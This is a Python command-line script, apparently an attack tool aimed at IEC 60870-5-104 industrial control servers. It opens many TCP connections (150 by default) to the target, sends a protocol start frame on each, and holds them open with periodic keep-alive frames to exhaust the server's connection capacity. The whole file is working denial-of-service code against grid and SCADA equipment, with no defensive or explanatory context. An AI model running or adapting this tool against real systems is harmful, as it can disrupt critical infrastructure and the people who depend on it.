import socket
import time
from threading import Thread
import typer
from utils.utils import *

sockets = []


def keep_alive():
    time.sleep(10)
    tmp = sockets
    for s in tmp:
        s.sendall(b'\x68\x04\x83\x00\x00\x00')
    keep_alive()


def connect(ip: str, port: int):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, port))
    s.sendall(b'\x68\x04\x07\x00\x00\x00')
    data = s.recv(1024)
    sockets.append(s)


def main(
        server_ip: str = typer.Argument(..., help="IP address of the IEC server."),
        server_port: int = typer.Option(2404, help="TCP port number of the IEC server."),
        connections: int = typer.Option(150, help="Number of connections to initiate.")
):
    if not is_ipv4_address(data=server_ip):
        typer.secho("[-] Invalid server IP provided.", fg=typer.colors.RED)
        exit(1)
    if not is_tcp_port(data=server_port):
        typer.secho("[-] Invalid server port provided.", fg=typer.colors.RED)
        exit(1)

    thread = Thread(target=keep_alive, daemon=True)
    thread.start()

    typer.secho("[*] Starting connections...", fg=typer.colors.YELLOW)
    with typer.progressbar(range(connections)) as progress:
        for _ in progress:
            try:
                connect(server_ip, server_port)
            except socket.timeout:
                typer.secho("[-] Socket timeout received probably exhausted connections.", fg=typer.colors.RED)
                break
    typer.secho("[+] Finished creating connections, only doing keep alive from now.", fg=typer.colors.GREEN)
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            typer.secho("[+] KeyboardInterrupt received, exiting application.", fg=typer.colors.GREEN)
            break


if __name__ == '__main__':
    typer.run(main)
